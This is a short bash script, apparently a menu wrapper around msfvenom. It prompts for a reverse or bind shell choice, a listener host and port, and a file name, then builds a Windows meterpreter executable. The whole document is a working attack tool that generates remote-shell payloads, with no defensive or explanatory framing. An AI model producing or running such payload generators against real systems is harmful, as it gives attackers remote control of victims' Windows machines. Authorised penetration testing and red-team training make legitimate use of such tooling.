#!/bin/bash

echo "Payload Types:"
echo "1. Reverse Shell"
echo "2. Bind Shell"
read -p "Choose payload type (1/2): " type
read -p "Enter LHOST: " lhost
read -p "Enter LPORT: " lport
read -p "Enter output file name: " filename

if [ "$type" -eq 1 ]; then
    payload="windows/meterpreter/reverse_tcp"
elif [ "$type" -eq 2 ]; then
    payload="windows/meterpreter/bind_tcp"
else
    echo "Invalid choice."
    exit 1
fi

msfvenom -p $payload LHOST=$lhost LPORT=$lport -f exe -o $filename.exe
echo "Payload generated: $filename.exe"
